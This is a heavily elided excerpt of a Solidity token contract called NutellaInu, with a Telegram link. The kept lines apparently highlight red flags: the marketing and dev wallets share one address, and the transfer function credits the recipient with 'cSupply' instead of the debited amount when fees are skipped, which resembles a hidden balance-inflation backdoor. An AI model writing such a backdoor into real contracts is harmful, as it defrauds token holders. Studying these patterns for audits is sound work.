...
//Telegram : https://t.me/nutellainu_bsc
...
contract NutellaInu is Context, IERC20 { 
    ...
    address payable public MarketingWallet = payable(0x71B742880b1B2945Ff5625004786be1316c7590A); 
    address payable public DevWallet = payable(0x71B742880b1B2945Ff5625004786be1316c7590A);
    ...
    uint256 public BurnFeePercent = 0;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_Burn = contractTokenBalance * BurnFeePercent / 100;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(!takenFee){
                ...
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+cSupply;
                emit Transfer(sender, recipient, tAmount);
            }
